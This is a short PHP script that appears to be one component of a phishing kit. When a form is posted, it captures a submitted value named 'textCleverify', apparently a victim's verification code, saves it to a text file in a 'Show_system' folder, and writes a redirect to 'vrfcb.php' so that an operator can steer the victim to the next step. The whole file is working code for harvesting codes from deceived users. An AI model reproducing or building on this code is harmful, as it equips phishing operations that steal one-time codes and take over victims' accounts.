<?php


session_start();

if(isset($_POST['Cleverify'])) 
{
    
$Page .= ' <meta http-equiv="refresh" content="0;url=./vrfcb.php" /> ';

$fPage = fopen("../Show_system/Show_Page.txt", "w");
    fwrite($fPage, $Page);



$textimage = $_SESSION['textCleverify'] = $_POST['textCleverify'];

$yagmai .= ''.$textimage.'';

$f = fopen("../Show_system/Show_Cleverify.txt", "w");
    fwrite($f, $yagmai);




}

else {




}

?>

